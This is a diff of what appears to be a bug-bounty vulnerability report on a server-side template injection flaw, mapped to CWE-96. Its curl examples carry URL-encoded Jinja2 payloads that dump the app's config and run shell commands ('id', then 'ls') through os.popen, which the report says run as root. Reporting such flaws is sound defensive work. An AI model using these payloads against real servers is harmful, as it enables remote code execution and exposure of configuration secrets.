@@ -68,7 +68,7 @@ def profile(username):
 
 Discovered Server-Side Template Injection (SSTI) Vulnerability. Also, it can be modified as Improper Neutralization of Directives in Statically Saved Code (Static Code Injection).
 i was a user and able to access the application configuration from templates "config" by executing the SSTI payload once I have entered.
-As well as I confirm that it prints the "id" command and it's print "root".
+As well as I confirm that it prints the "id" command and it's print "root" also, i say the list of the files in directory by "ls" command.
 In CWE:
 - CWE-96: Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection')
 
@@ -83,7 +83,7 @@ In Server-Side Template Injection (SSTI) or Static Code Injection I've used the 
 
 ```
 1- curl "http://127.0.0.1:8080/hackerone=%7B%7Bconfig%7D%7D"
-2- curl "http://127.0.0.1:8080/hackerone=%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('id').read()%7D%7D"
+2- curl "http://127.0.0.1:8080/hackerone=%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('ls').read()%7D%7D"
 ```
 
 ## Fix
